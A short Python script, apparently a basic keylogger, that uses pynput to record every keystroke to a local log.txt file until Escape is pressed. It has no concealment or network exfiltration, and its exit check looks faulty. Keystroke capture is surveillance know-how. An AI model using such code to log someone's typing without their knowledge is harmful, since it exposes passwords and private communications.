from pynput.keyboard import Listener
def on_press(key):
    try:
        with open("log.txt", "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(f'[{key}]')

def on_release(key):
    # Exit the program if 'esc' is pressed
    if key == key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()